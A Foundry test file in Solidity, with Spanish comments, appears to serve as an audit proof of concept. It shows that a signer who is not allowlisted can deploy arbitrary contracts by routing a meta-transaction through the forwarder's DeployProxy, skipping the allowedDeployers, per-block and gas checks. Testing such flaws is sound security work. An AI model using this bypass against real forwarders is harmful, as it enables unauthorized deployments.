// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {MetaTxForwarder, DeployProxy} from "../../contracts/MetaTxForwarder.sol";

/// @dev Contrato trivial que desplegaremos como "payload" del ataque.
contract Dummy {
    uint256 public x = 1;
}

/// @notice PoC: un firmante que NO está en `allowedDeployers` despliega un
///         contrato arbitrario apuntando f.to directamente al DeployProxy auxiliar
///         (ruta _executeCall), saltándose allowedDeployers, el límite por bloque,
///         el bucket de gas y el cap de 5M de gas (fix H-02).
contract DeployProxyBypassTest is Test {
    MetaTxForwarder internal hub;

    address internal owner   = makeAddr("owner");
    address internal relayer = makeAddr("relayer");
    address internal attacker;
    uint256 internal attackerPk;

    bytes32 constant FORWARD_TYPEHASH = keccak256(
        "Forward(address from,address to,uint256 value,uint32 space,uint256 nonce,uint256 deadline,bytes32 dataHash,address caller)"
    );

    function setUp() public {
        (attacker, attackerPk) = makeAddrAndKey("attacker");
        vm.prank(owner);
        hub = new MetaTxForwarder();
        vm.prank(owner);
        hub.setCallerAllowed(relayer, true);
        // NOTA: el attacker NO es allowlisteado como deployer a propósito.
    }

    /// Control: la ruta legítima de deploy (f.to == address(0)) rechaza al
    /// attacker porque NO está en allowedDeployers.
    function test_Control_LegitDeployPathRejectsNonAllowedDeployer() public {
        bytes memory initcode = type(Dummy).creationCode;
        MetaTxForwarder.Forward memory f = MetaTxForwarder.Forward({
            from: attacker, to: address(0), value: 0, space: 0, nonce: 1,
            deadline: block.timestamp + 1 hours, dataHash: keccak256(initcode), caller: relayer
        });
        bytes memory sig = _sign(f);
        vm.prank(relayer);
        vm.expectRevert(MetaTxForwarder.DeployerNotAllowed.selector);
        hub.execute(f, initcode, sig);
    }

    /// EXPLOIT: misma intención (desplegar arbitrario) pero ruteando por el
    /// DeployProxy → bypassa por completo el control allowedDeployers.
    function test_Exploit_DeployViaProxyBypassesAllowlist() public {
        // El DeployProxy se crea en el constructor del hub: CREATE(hub, nonce=1).
        address proxy = vm.computeCreateAddress(address(hub), 1);
        assertGt(proxy.code.length, 0, "deployProxy debe existir");

        // calldata para DeployProxy.deploy(bytes): despliega un Dummy.
        bytes memory initcode = type(Dummy).creationCode;
        bytes memory data = abi.encodeWithSelector(DeployProxy.deploy.selector, initcode);

        MetaTxForwarder.Forward memory f = MetaTxForwarder.Forward({
            from: attacker,
            to: proxy,                 // <-- apuntar al proxy en vez de address(0)
            value: 0, space: 0, nonce: 1,
            deadline: block.timestamp + 1 hours,
            dataHash: keccak256(data),
            caller: relayer
        });
        bytes memory sig = _sign(f);

        // Dirección esperada del contrato desplegado por el proxy: CREATE(proxy, nonce=1).
        address expectedDeployed = vm.computeCreateAddress(proxy, 1);
        assertEq(expectedDeployed.code.length, 0, "aun no desplegado");

        vm.prank(relayer);
        hub.execute(f, data, sig); // NO revierte con DeployerNotAllowed

        // Se desplegó un contrato arbitrario pese a que attacker NO es allowedDeployer.
        assertGt(expectedDeployed.code.length, 0, "BYPASS: contrato desplegado sin permiso");
        assertEq(Dummy(expectedDeployed).x(), 1);

        // Y los controles de deploy quedaron intactos (no se registró el deploy):
        // confirma que se ejecuto por la ruta CALL, no la de CREATE controlada.
        MetaTxForwarder.DeployerInfo memory info = hub.getDeployerInfo(attacker);
        assertEq(info.lastDeployBlock, 0, "el limite per-block NO se aplico (bypass confirmado)");
    }

    function _sign(MetaTxForwarder.Forward memory f) internal view returns (bytes memory) {
        bytes32 structHash = keccak256(abi.encode(
            FORWARD_TYPEHASH, f.from, f.to, f.value, f.space, f.nonce, f.deadline, f.dataHash, f.caller
        ));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", _domainSeparator(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPk, digest);
        return abi.encodePacked(r, s, v);
    }

    function _domainSeparator() internal view returns (bytes32) {
        (, string memory name, string memory version, uint256 chainId, address vc,,)
            = hub.eip712Domain();
        return keccak256(abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256(bytes(name)), keccak256(bytes(version)), chainId, vc
        ));
    }
}
